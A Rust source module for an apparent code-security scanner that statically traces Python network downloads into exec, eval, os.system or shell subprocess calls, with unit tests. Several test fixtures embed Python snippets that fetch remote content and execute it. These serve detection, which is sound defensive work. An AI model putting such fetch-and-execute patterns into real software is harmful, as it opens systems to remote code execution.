//! Bounded, syntax-gated Python download-to-execution analysis.
//!
//! This is deliberately a small local value model.  Tree-sitter supplies the
//! parse/error boundary; the evaluator only carries static provenance through
//! the explicitly supported spellings below.  It never imports, evaluates, or
//! executes Python code.

use std::collections::{BTreeMap, BTreeSet};
use std::time::Instant;

use omasafe_core::bounds::{
    MAX_PYTHON_FLOW_BINDINGS, MAX_PYTHON_FLOW_DEPTH, MAX_PYTHON_FLOW_NODES,
    MAX_PYTHON_FLOW_SOURCE_BYTES, MAX_PYTHON_FLOW_STATEMENTS, PYTHON_FLOW_TIME_BUDGET,
};

use crate::detect::model::{
    FileOutcome, PYTHON_DOWNLOAD_EXECUTE_RULE, occurrence, parts, strip_line_comment,
};
use crate::fingerprint::Confidence;
use crate::rules::{Capability, Language};
use tree_sitter::Node;

#[derive(Debug, Clone, PartialEq, Eq)]
enum Value {
    Static,
    NetworkResponse { source_line: u32, detail: String },
    NetworkBytes { source_line: u32, detail: String },
    Unknown,
}

#[derive(Default)]
struct Environment {
    imports: BTreeMap<String, String>,
    values: BTreeMap<String, Value>,
    shadowed: BTreeSet<String>,
}

impl Environment {
    fn resolve_import(&self, name: &str) -> Option<&str> {
        if self.shadowed.contains(name) {
            return None;
        }
        self.imports.get(name).map(String::as_str)
    }

    fn get(&self, name: &str) -> Value {
        if let Some(value) = self.values.get(name) {
            return value.clone();
        }
        if self.shadowed.contains(name) {
            return Value::Unknown;
        }
        if self.imports.contains_key(name) {
            return Value::Unknown;
        }
        if matches!(name, "exec" | "eval") {
            Value::Static
        } else {
            Value::Unknown
        }
    }

    fn set(&mut self, name: &str, value: Value) {
        self.values.insert(name.to_owned(), value);
        self.shadowed.insert(name.to_owned());
        self.imports.remove(name);
    }
}

/// Analyze one Python file after a successful tree-sitter parse.
pub(super) fn analyze(source: &str, outcome: &mut FileOutcome) {
    if source.len() > MAX_PYTHON_FLOW_SOURCE_BYTES {
        outcome
            .limitations
            .push("python-flow-source-limit".to_owned());
        return;
    }
    let deadline = Instant::now() + PYTHON_FLOW_TIME_BUDGET;
    let mut node_count = 0usize;
    let Some(tree) = parse(source, &mut node_count) else {
        outcome.limitations.push("python-parse-error".to_owned());
        return;
    };
    if node_count > MAX_PYTHON_FLOW_NODES {
        outcome
            .limitations
            .push("python-flow-node-limit".to_owned());
        return;
    }
    if tree.root_node().has_error() {
        outcome.limitations.push("python-parse-error".to_owned());
        return;
    }

    let (module_statements, functions, depth_limited) = lower_scopes(source, tree.root_node());
    if depth_limited {
        outcome
            .limitations
            .push("python-flow-depth-limit".to_owned());
    }
    let statement_count = module_statements.len()
        + functions
            .iter()
            .map(|function| function.body.len())
            .sum::<usize>();
    if statement_count > MAX_PYTHON_FLOW_STATEMENTS {
        outcome
            .limitations
            .push("python-flow-statement-limit".to_owned());
        return;
    }
    if module_statements.is_empty() && functions.is_empty() {
        return;
    }

    // The local model deliberately does not guess branch joins, loop
    // iterations, exception paths, or reflective/comprehension semantics.
    // Mark the unit unresolved before evaluating any nested statements so a
    // partial linear walk cannot manufacture a cross-boundary execution edge.
    if module_statements
        .iter()
        .any(|statement| statement.unsupported)
        || functions
            .iter()
            .any(|function| function.body.iter().any(|statement| statement.unsupported))
    {
        outcome
            .limitations
            .push("python-flow-unsupported".to_owned());
        return;
    }

    let mut module = Environment {
        shadowed: assigned_names(&module_statements),
        ..Environment::default()
    };
    module.shadowed.extend(
        functions
            .iter()
            .filter(|function| function.top_level)
            .filter_map(|function| function.name.as_deref())
            .map(str::to_owned),
    );
    evaluate_statements(&module_statements, &mut module, deadline, outcome);

    for function in functions {
        if Instant::now() >= deadline {
            outcome
                .limitations
                .push("python-flow-time-limit".to_owned());
            return;
        }
        let mut local = Environment {
            imports: module.imports.clone(),
            values: BTreeMap::new(),
            shadowed: module
                .shadowed
                .clone()
                .into_iter()
                .chain(function.params)
                .chain(assigned_names(&function.body))
                .collect(),
        };
        evaluate_statements(&function.body, &mut local, deadline, outcome);
    }
}

fn parse(source: &str, nodes: &mut usize) -> Option<tree_sitter::Tree> {
    let mut parser = tree_sitter::Parser::new();
    let language: tree_sitter::Language = tree_sitter_python::LANGUAGE.into();
    parser.set_language(&language).ok()?;
    let tree = parser.parse(source.as_bytes(), None)?;
    let mut stack = vec![tree.root_node()];
    while let Some(node) = stack.pop() {
        *nodes = nodes.saturating_add(1);
        if *nodes > MAX_PYTHON_FLOW_NODES {
            break;
        }
        let mut cursor = node.walk();
        stack.extend(node.children(&mut cursor));
    }
    Some(tree)
}

#[derive(Clone)]
struct Statement {
    text: String,
    line: u32,
    calls: Vec<CallSite>,
    is_function: bool,
    is_return: bool,
    unsupported: bool,
    function_name: Option<String>,
}

#[derive(Clone)]
struct CallSite {
    callee: String,
    args: String,
}

#[derive(Clone)]
struct FunctionScope {
    params: BTreeSet<String>,
    body: Vec<Statement>,
    name: Option<String>,
    top_level: bool,
}

/// Lower the direct statement children of a parser container.  Python's
/// grammar already separates semicolon statements, comments, and multiline
/// expressions, so this avoids trying to recreate those boundaries from
/// source text (where an apostrophe in a comment or an escaped quote can
/// otherwise hide every following statement).
fn lower_scopes(source: &str, root: Node<'_>) -> (Vec<Statement>, Vec<FunctionScope>, bool) {
    let mut module = Vec::new();
    let mut functions = Vec::new();
    let mut depth_limited = false;
    let mut cursor = root.walk();
    for node in root.named_children(&mut cursor) {
        match node.kind() {
            "function_definition" | "decorated_definition" => {
                lower_function(source, node, &mut functions, 0, true, &mut depth_limited);
            }
            "comment" => {}
            _ => module.push(lower_statement(source, node)),
        }
    }
    (module, functions, depth_limited)
}

fn lower_function(
    source: &str,
    node: Node<'_>,
    functions: &mut Vec<FunctionScope>,
    depth: usize,
    top_level: bool,
    depth_limited: &mut bool,
) {
    if depth >= MAX_PYTHON_FLOW_DEPTH {
        *depth_limited = true;
        return;
    }
    let definition = if node.kind() == "decorated_definition" {
        node.child_by_field_name("definition")
    } else {
        Some(node)
    };
    let Some(definition) = definition else {
        return;
    };
    let params = definition
        .child_by_field_name("parameters")
        .and_then(|parameters| parameters.utf8_text(source.as_bytes()).ok())
        .map(function_parameters)
        .unwrap_or_default();
    let name = definition
        .child_by_field_name("name")
        .and_then(|name| name.utf8_text(source.as_bytes()).ok())
        .map(str::to_owned);
    let body_node = definition.child_by_field_name("body");
    let body = body_node
        .map(|body| lower_container(source, body))
        .unwrap_or_default();
    functions.push(FunctionScope {
        params,
        body: body.clone(),
        name,
        top_level,
    });

    // A nested function is a separate scope.  Keep its definition as an
    // inert marker in the containing body, and evaluate its body independently
    // if it is encountered during this bounded lowering pass.
    if let Some(body_node) = body_node {
        let mut cursor = body_node.walk();
        for child in body_node.named_children(&mut cursor) {
            if matches!(child.kind(), "function_definition" | "decorated_definition") {
                lower_function(source, child, functions, depth + 1, false, depth_limited);
            }
        }
    }
}

fn lower_container(source: &str, container: Node<'_>) -> Vec<Statement> {
    let mut statements = Vec::new();
    let mut cursor = container.walk();
    for node in container.named_children(&mut cursor) {
        if node.kind() != "comment" {
            statements.push(lower_statement(source, node));
        }
    }
    statements
}

fn lower_statement(source: &str, node: Node<'_>) -> Statement {
    let text = node
        .utf8_text(source.as_bytes())
        .unwrap_or_default()
        .to_owned();
    Statement {
        text,
        line: node.start_position().row as u32 + 1,
        calls: lower_calls(source, node),
        is_function: matches!(node.kind(), "function_definition" | "decorated_definition"),
        is_return: node.kind() == "return_statement",
        unsupported: contains_unsupported_node(source, node),
        function_name: if matches!(node.kind(), "function_definition" | "decorated_definition") {
            let definition = if node.kind() == "decorated_definition" {
                node.child_by_field_name("definition")
            } else {
                Some(node)
            };
            definition
                .and_then(|definition| definition.child_by_field_name("name"))
                .and_then(|name| name.utf8_text(source.as_bytes()).ok())
                .map(str::to_owned)
        } else {
            None
        },
    }
}

fn contains_unsupported_node(source: &str, node: Node<'_>) -> bool {
    let mut stack = vec![node];
    while let Some(current) = stack.pop() {
        if matches!(
            current.kind(),
            "class_definition"
                | "conditional_expression"
                | "dictionary_comprehension"
                | "for_statement"
                | "generator_expression"
                | "if_statement"
                | "lambda"
                | "list_comprehension"
                | "match_statement"
                | "set_comprehension"
                | "try_statement"
                | "while_statement"
                | "with_statement"
                | "yield"
        ) {
            return true;
        }
        let mut cursor = current.walk();
        stack.extend(current.named_children(&mut cursor));
    }
    node.kind() == "import_statement"
        && clean(node.utf8_text(source.as_bytes()).unwrap_or_default()).contains("import *")
}

fn lower_calls(source: &str, node: Node<'_>) -> Vec<CallSite> {
    let mut calls = Vec::new();
    let mut stack = vec![node];
    while let Some(current) = stack.pop() {
        if current.kind() == "call" {
            let Some(function) = current.child_by_field_name("function") else {
                continue;
            };
            let Some(arguments) = current.child_by_field_name("arguments") else {
                continue;
            };
            let Ok(callee) = function.utf8_text(source.as_bytes()) else {
                continue;
            };
            let Ok(argument_text) = arguments.utf8_text(source.as_bytes()) else {
                continue;
            };
            calls.push(CallSite {
                callee: callee.trim().to_owned(),
                args: call_argument_text(argument_text),
            });
        }
        let mut cursor = current.walk();
        stack.extend(current.named_children(&mut cursor));
    }
    calls
}

fn call_argument_text(arguments: &str) -> String {
    let trimmed = arguments.trim();
    if trimmed.starts_with('(')
        && matching(trimmed, 0, b'(', b')') == Some(trimmed.len().saturating_sub(1))
    {
        trimmed[1..trimmed.len().saturating_sub(1)].to_owned()
    } else {
        trimmed.to_owned()
    }
}

fn collect_imports(statements: &[Statement]) -> BTreeMap<String, String> {
    let mut imports = BTreeMap::new();
    for statement in statements {
        let line = clean(&statement.text);
        let text = line.trim();
        if let Some(rest) = text.strip_prefix("import ") {
            for item in rest.split(',') {
                let mut words = item.split_whitespace();
                let path = words.next().unwrap_or("");
                if path.is_empty() || path == "*" {
                    continue;
                }
                let alias = if words.next() == Some("as") {
                    words
                        .next()
                        .unwrap_or(path.rsplit('.').next().unwrap_or(path))
                } else {
                    path.split('.').next().unwrap_or(path)
                };
                imports.insert(alias.to_owned(), path.to_owned());
            }
        } else if let Some(rest) = text.strip_prefix("from ") {
            let Some((module, names)) = rest.split_once(" import ") else {
                continue;
            };
            for item in names.split(',') {
                let mut words = item.split_whitespace();
                let name = words.next().unwrap_or("");
                if name.is_empty() || name == "*" {
                    continue;
                }
                let alias = if words.next() == Some("as") {
                    words.next().unwrap_or(name)
                } else {
                    name
                };
                imports.insert(alias.to_owned(), format!("{module}.{name}"));
            }
        }
    }
    imports
}

fn assigned_names(statements: &[Statement]) -> BTreeSet<String> {
    statements
        .iter()
        .filter_map(|statement| {
            statement.function_name.clone().or_else(|| {
                split_assignment(&clean(&statement.text)).map(|(name, _)| name.to_owned())
            })
        })
        .filter(|name| is_name(name))
        .collect()
}

fn function_parameters(header: &str) -> BTreeSet<String> {
    let Some(open) = header.find('(') else {
        return BTreeSet::new();
    };
    let Some(close) = matching(header, open, b'(', b')') else {
        return BTreeSet::new();
    };
    split_top_level(&header[open + 1..close], ',')
        .into_iter()
        .filter_map(|parameter| {
            let parameter = parameter.trim().trim_start_matches('*');
            let mut name = parameter;
            if let Some((prefix, _)) = name.split_once(':') {
                name = prefix;
            }
            if let Some((prefix, _)) = name.split_once('=') {
                name = prefix;
            }
            let name = name.trim();
            is_name(name).then_some(name.to_owned())
        })
        .collect()
}

fn split_top_level(text: &str, separator: char) -> Vec<&str> {
    let mut values = Vec::new();
    let mut start = 0usize;
    let mut depth = 0usize;
    let mut quote = None;
    let bytes = text.as_bytes();
    let mut index = 0usize;
    while index < bytes.len() {
        let byte = bytes[index];
        match quote {
            Some(_) if byte == b'\\' => {
                index = index.saturating_add(2);
                continue;
            }
            Some(active) if byte == active => quote = None,
            Some(_) => {}
            None if byte == b'\'' || byte == b'"' => quote = Some(byte),
            None if matches!(byte, b'(' | b'[' | b'{') => depth += 1,
            None if matches!(byte, b')' | b']' | b'}') => depth = depth.saturating_sub(1),
            None if byte == separator as u8 && depth == 0 => {
                values.push(text[start..index].trim());
                start = index + 1;
            }
            None => {}
        }
        index += 1;
    }
    values.push(text[start..].trim());
    values
}

fn has_shell_true(args: &str) -> bool {
    split_top_level(args, ',').into_iter().any(|argument| {
        let argument = argument.trim();
        let Some((name, value)) = argument.split_once('=') else {
            return false;
        };
        name.trim() == "shell" && value.trim() == "True"
    })
}

fn evaluate_statements(
    statements: &[Statement],
    env: &mut Environment,
    deadline: Instant,
    outcome: &mut FileOutcome,
) {
    for statement in statements {
        if Instant::now() >= deadline {
            outcome
                .limitations
                .push("python-flow-time-limit".to_owned());
            return;
        }
        if statement.is_function {
            continue;
        }
        let text = clean(&statement.text);
        let trimmed = text.trim();
        if trimmed.is_empty() {
            continue;
        }
        if trimmed.starts_with("import ") || trimmed.starts_with("from ") {
            for (name, path) in collect_imports(&[Statement {
                text: trimmed.to_owned(),
                line: statement.line,
                calls: Vec::new(),
                is_function: false,
                is_return: false,
                unsupported: false,
                function_name: None,
            }]) {
                env.imports.insert(name.clone(), path);
                env.shadowed.remove(&name);
                env.values.remove(&name);
            }
            continue;
        }
        if let Some(name) = trimmed
            .strip_prefix("del ")
            .map(str::trim)
            .filter(|s| is_name(s))
        {
            env.set(name, Value::Unknown);
            continue;
        }
        if let Some((name, rhs)) = split_assignment(trimmed) {
            if !is_name(name) {
                outcome
                    .limitations
                    .push("python-flow-unsupported".to_owned());
                continue;
            }
            if env.values.len() >= MAX_PYTHON_FLOW_BINDINGS && !env.values.contains_key(name) {
                outcome
                    .limitations
                    .push("python-flow-binding-limit".to_owned());
                return;
            }
            // Calls on the RHS execute before the assignment becomes visible.
            // Inspect them with the pre-assignment environment so an assigned
            // sink cannot hide the network-bytes edge.
            inspect_sinks(&statement.calls, env, statement.line, outcome);
            let value = eval_expr(rhs, env, statement.line, 0);
            env.set(name, value);
            continue;
        }
        inspect_sinks(&statement.calls, env, statement.line, outcome);
        // A return terminates the remainder of this function body.  Calls in
        // the return expression have already been inspected above.
        if statement.is_return {
            return;
        }
    }
}

fn eval_expr(expr: &str, env: &Environment, line: u32, depth: usize) -> Value {
    if depth > MAX_PYTHON_FLOW_DEPTH {
        return Value::Unknown;
    }
    let expr = strip_outer_parens(expr.trim());
    if is_name(expr) {
        return env.get(expr);
    }
    if is_string(expr) {
        return Value::Static;
    }
    if let Some((callee, args)) = call_parts(expr) {
        let import = resolve_callee(callee, env);
        if matches!(
            import.as_deref(),
            Some("requests.get" | "urllib.request.urlopen")
        ) {
            let detail = first_arg(args).unwrap_or("dynamic-url").to_owned();
            let response = Value::NetworkResponse {
                source_line: line,
                detail,
            };
            return if expr.trim_end().ends_with(").text")
                || expr.trim_end().ends_with(").content")
                || expr.trim_end().ends_with(").read()")
            {
                response_to_bytes(response)
            } else {
                response
            };
        }
    }
    if let Some((base, property)) = expr.rsplit_once('.') {
        let value = eval_expr(base, env, line, depth + 1);
        if matches!(property, "text" | "content" | "read()") {
            return response_to_bytes(value);
        }
    }
    Value::Unknown
}

fn response_to_bytes(value: Value) -> Value {
    match value {
        Value::NetworkResponse {
            source_line,
            detail,
        } => Value::NetworkBytes {
            source_line,
            detail,
        },
        other => other,
    }
}

fn inspect_sinks(calls: &[CallSite], env: &Environment, line: u32, outcome: &mut FileOutcome) {
    for call in calls {
        let callee = call.callee.as_str();
        let args = call.args.as_str();
        let Some(first) = first_arg(args) else {
            continue;
        };
        let value = eval_expr(first, env, line, 0);
        let shell_true = has_shell_true(args);
        let interpreter_code = literal_interpreter_code(args, env, line);
        let sink = is_builtin_sink(callee, env)
            || is_os_system(callee, env)
            || (is_subprocess_sink(callee, env) && (shell_true || interpreter_code.is_some()));
        let value = interpreter_code.or_else(|| Some(value.clone()));
        if sink && matches!(value, Some(Value::NetworkBytes { .. })) {
            let Value::NetworkBytes {
                source_line,
                detail,
            } = value.unwrap()
            else {
                continue;
            };
            outcome.result_parts.push(parts(
                PYTHON_DOWNLOAD_EXECUTE_RULE,
                line,
                format!(
                    "download-execute:source-line-{source_line}:sink-line-{line}:{callee}:{detail}"
                ),
                Confidence::AstBacked,
            ));
        }
    }
}

fn is_builtin_sink(callee: &str, env: &Environment) -> bool {
    matches!(callee, "exec" | "eval")
        && !env.shadowed.contains(callee)
        && env.resolve_import(callee).is_none()
}

fn is_os_system(callee: &str, env: &Environment) -> bool {
    resolve_callee(callee, env).as_deref() == Some("os.system")
}

fn is_subprocess_sink(callee: &str, env: &Environment) -> bool {
    let qualified = resolve_callee(callee, env).unwrap_or_default();
    matches!(
        qualified.as_str(),
        "subprocess.run"
            | "subprocess.Popen"
            | "subprocess.call"
            | "subprocess.check_call"
            | "subprocess.check_output"
    )
}

fn literal_interpreter_code(args: &str, env: &Environment, line: u32) -> Option<Value> {
    // The interpreter argv is the first positional argument.  Keyword
    // arguments such as `check=True` follow it and are not part of the argv
    // list.
    let trimmed = first_arg(args)?.trim();
    if !(trimmed.starts_with('[') && trimmed.ends_with(']')) {
        return None;
    }
    let items = split_top_level(&trimmed[1..trimmed.len() - 1], ',');
    let executable = literal_string(items.first().copied()?)?;
    let executable = executable.rsplit('/').next().unwrap_or(executable);
    let supported = matches!(
        executable,
        "sh" | "bash" | "dash" | "zsh" | "ksh" | "ash" | "python" | "python2" | "python3"
    );
    if !supported || items.get(1).and_then(|item| literal_string(item)) != Some("-c") {
        return None;
    }
    let code = items.get(2)?;
    match eval_expr(code, env, line, 0) {
        value @ Value::NetworkBytes { .. } => Some(value),
        _ => None,
    }
}

fn literal_string(value: &str) -> Option<&str> {
    let value = value.trim();
    (value.len() >= 2
        && ((value.starts_with('\'') && value.ends_with('\''))
            || (value.starts_with('"') && value.ends_with('"'))))
    .then_some(&value[1..value.len() - 1])
}

fn resolve_callee(callee: &str, env: &Environment) -> Option<String> {
    if let Some((head, tail)) = callee.split_once('.') {
        let imported = env.resolve_import(head)?;
        if imported == head || callee.starts_with(&format!("{imported}.")) {
            return Some(callee.to_owned());
        }
        return Some(format!("{imported}.{tail}"));
    }
    env.resolve_import(callee).map(str::to_owned)
}

fn call_parts(expr: &str) -> Option<(&str, &str)> {
    let open = expr.find('(')?;
    let end = matching(expr, open, b'(', b')')?;
    (end + 1 == expr.len()).then_some((expr[..open].trim(), &expr[open + 1..end]))
}

fn matching(text: &str, open: usize, opener: u8, closer: u8) -> Option<usize> {
    let mut depth = 0usize;
    let mut quote = None;
    let bytes = text.as_bytes();
    let mut index = open;
    while index < bytes.len() {
        let byte = bytes[index];
        match quote {
            Some(_) if byte == b'\\' => {
                index = index.saturating_add(2);
                continue;
            }
            Some(active) if byte == active => quote = None,
            Some(_) => {}
            None if byte == b'\'' || byte == b'"' => quote = Some(byte),
            None if byte == opener => depth += 1,
            None if byte == closer => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return Some(index);
                }
            }
            None => {}
        }
        index += 1;
    }
    None
}

fn first_arg(args: &str) -> Option<&str> {
    let mut depth = 0usize;
    let mut quote = None;
    let bytes = args.as_bytes();
    let mut index = 0usize;
    while index < bytes.len() {
        let byte = bytes[index];
        match quote {
            Some(_) if byte == b'\\' => {
                index = index.saturating_add(2);
                continue;
            }
            Some(active) if byte == active => quote = None,
            Some(_) => {}
            None if byte == b'\'' || byte == b'"' => quote = Some(byte),
            None if matches!(byte, b'(' | b'[' | b'{') => depth += 1,
            None if matches!(byte, b')' | b']' | b'}') => depth = depth.saturating_sub(1),
            None if byte == b',' && depth == 0 => return Some(args[..index].trim()),
            None => {}
        }
        index += 1;
    }
    (!args.trim().is_empty()).then_some(args.trim())
}

fn split_assignment(text: &str) -> Option<(&str, &str)> {
    let mut depth = 0usize;
    let bytes = text.as_bytes();
    for (index, byte) in bytes.iter().enumerate() {
        match byte {
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth = depth.saturating_sub(1),
            b'=' if depth == 0
                && (index == 0 || bytes[index - 1] != b'=')
                && bytes.get(index + 1) != Some(&b'=') =>
            {
                return Some((text[..index].trim(), text[index + 1..].trim()));
            }
            _ => {}
        }
    }
    None
}

fn strip_outer_parens(mut text: &str) -> &str {
    loop {
        let trimmed = text.trim();
        if trimmed.starts_with('(') && matching(trimmed, 0, b'(', b')') == Some(trimmed.len() - 1) {
            text = &trimmed[1..trimmed.len() - 1];
        } else {
            return trimmed;
        }
    }
}

fn clean(text: &str) -> String {
    strip_line_comment(text, crate::detect::model::CommentStyle::PythonHash)
        .trim()
        .to_owned()
}

fn is_name(text: &str) -> bool {
    !text.is_empty()
        && text
            .chars()
            .all(|character| character == '_' || character.is_ascii_alphanumeric())
        && !text.chars().next().unwrap().is_ascii_digit()
}

fn is_string(text: &str) -> bool {
    (text.starts_with('"') && text.ends_with('"'))
        || (text.starts_with('\'') && text.ends_with('\''))
}

#[allow(dead_code)]
fn _python_capability(outcome: &mut FileOutcome, line: u32) {
    outcome.capabilities.push(occurrence(
        Capability::NetworkAccess,
        Language::Python,
        line,
        "python network response",
    ));
}

#[cfg(test)]
mod tests {
    use super::*;

    fn outcome(source: &str) -> FileOutcome {
        let mut value = FileOutcome {
            result_parts: Vec::new(),
            capabilities: Vec::new(),
            references: Vec::new(),
            parse_degraded: false,
            confidence: Confidence::AstBacked,
            limitations: Vec::new(),
        };
        analyze(source, &mut value);
        value
    }

    #[test]
    fn connects_multiline_requests_text_to_exec() {
        let value = outcome(
            "import requests\ncode = requests.get('https://example.test/a').text\nexec(code)\n",
        );
        assert_eq!(value.result_parts.len(), 1);
        assert!(
            value.result_parts[0]
                .semantic_value
                .contains("source-line-2")
        );
        assert!(value.result_parts[0].semantic_value.contains("sink-line-3"));
    }

    #[test]
    fn unrelated_subprocess_does_not_connect() {
        let value = outcome(
            "import requests\nrequests.get('https://example.test/a')\nimport subprocess\nsubprocess.run(['date'])\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn aliases_and_interpreter_code_are_supported() {
        let value = outcome(
            "import requests as r\nfrom subprocess import run\nbody = r.get(url).content\nrun(['sh', '-c', body])\n",
        );
        assert_eq!(value.result_parts.len(), 1);
    }

    #[test]
    fn response_object_alone_is_not_code() {
        let value = outcome("import requests\nresponse = requests.get(url)\nexec(response)\n");
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn urllib_semicolon_form_is_supported() {
        let value = outcome(
            "import urllib.request\ndata = urllib.request.urlopen(\"https://example.test/x\").read(); exec(data)\n",
        );
        assert_eq!(value.result_parts.len(), 1, "{:?}", value.limitations);
    }

    #[test]
    fn unsupported_loop_does_not_invent_a_cross_boundary_flow() {
        let value = outcome(
            "import requests\nfor item in items:\n    code = requests.get(url).text\n    exec(code)\n",
        );
        assert!(value.result_parts.is_empty());
        assert!(
            value
                .limitations
                .iter()
                .any(|reason| reason == "python-flow-unsupported")
        );
    }

    #[test]
    fn shell_true_spacing_is_accepted_for_subprocess_sink() {
        let value = outcome(
            "import requests\nimport subprocess\ncode = requests.get(url).text\nsubprocess.run(code, shell = True)\n",
        );
        assert_eq!(value.result_parts.len(), 1);
    }

    #[test]
    fn quoted_sink_text_is_inert() {
        let value =
            outcome("import requests\ncode = requests.get(url).text\nprint('exec(code)')\n");
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn assigned_sinks_are_still_inspected() {
        let value =
            outcome("import requests\ncode = requests.get(url).text\nresult = eval(code)\n");
        assert_eq!(value.result_parts.len(), 1);
    }

    #[test]
    fn ordinary_argv_c_flag_is_not_an_interpreter_sink() {
        let value = outcome(
            "import requests\ncode = requests.get(url).text\nimport subprocess\nsubprocess.run(['printf', '-c', code])\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn unrelated_get_import_is_unknown() {
        let value = outcome("from cache import get\ncode = get('cache-key').text\nexec(code)\n");
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn function_parameters_shadow_builtins_and_imports() {
        let value = outcome(
            "def f(exec):\n    import requests\n    code = requests.get(url).text\n    exec(code)\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn rebound_os_module_is_not_a_system_sink() {
        let value = outcome(
            "import requests\ncode = requests.get(url).text\nimport os\nos = callback\nos.system(code)\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn rebound_subprocess_module_is_not_a_process_sink() {
        let value = outcome(
            "import requests\ncode = requests.get(url).text\nimport subprocess\nsubprocess = callback\nsubprocess.run(code, shell=True)\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn imported_exec_name_is_not_the_builtin_sink() {
        let value = outcome(
            "from callbacks import exec\nimport requests\ncode = requests.get(url).text\nexec(code)\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn function_definition_name_shadows_builtin_at_module_scope() {
        let value = outcome(
            "import requests\ndef exec(value):\n    return value\ncode = requests.get(url).text\nexec(code)\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn module_function_binding_shadows_builtin_in_other_functions() {
        let value = outcome(
            "import requests\ndef exec(value):\n    return value\ndef f():\n    code = requests.get(url).text\n    exec(code)\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn comment_with_apostrophe_does_not_hide_following_flow() {
        let value = outcome(
            "# author's note\nimport requests\ncode = requests.get(url).text\nexec(code)\n",
        );
        assert_eq!(value.result_parts.len(), 1, "{:?}", value.limitations);
    }

    #[test]
    fn escaped_quote_string_does_not_hide_following_flow() {
        let value = outcome(
            "import requests\ncode = requests.get(url).text\nprint(\"don't\\\" panic\")\nexec(code)\n",
        );
        assert_eq!(value.result_parts.len(), 1, "{:?}", value.limitations);
    }

    #[test]
    fn interpreter_argv_can_have_keyword_arguments() {
        let value = outcome(
            "import requests\ncode = requests.get(url).text\nimport subprocess\nsubprocess.run(['sh', '-c', code], check=True)\n",
        );
        assert_eq!(value.result_parts.len(), 1, "{:?}", value.limitations);
    }

    #[test]
    fn non_executing_c_flag_interpreters_are_not_sinks() {
        let value = outcome(
            "import requests\ncode = requests.get(url).text\nimport subprocess\nsubprocess.run(['perl', '-c', code], check=True)\n",
        );
        assert!(value.result_parts.is_empty());
    }

    #[test]
    fn return_stops_unreachable_flow_in_function() {
        let value = outcome(
            "import requests\ndef f():\n    return\n    code = requests.get(url).text\n    exec(code)\n",
        );
        assert!(value.result_parts.is_empty());
    }
}
